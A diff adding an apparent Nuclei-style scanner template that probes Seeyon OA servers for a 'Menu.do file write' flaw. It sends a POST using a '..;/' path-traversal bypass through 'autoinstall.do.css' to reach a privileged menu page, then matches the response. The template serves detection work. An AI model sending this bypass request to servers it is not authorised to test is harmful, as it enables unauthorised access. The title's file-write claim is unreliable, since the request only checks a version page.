@@ -1,0 +1,20 @@
+id: poc-yaml-seeyon-menu-do-file-write
+info:
+  name: Seeyon Menu.do File Write Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-write
+http:
+  - method: POST
+    path:
+      - "/seeyon/autoinstall.do.css/..;/privilege/menu.do?method=showVersion"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<label for=\"radio1\" class=\"margin_t_5 hand display_block\">"
+      - type: word
+        part: body
+        words:
+          - "seeyon"
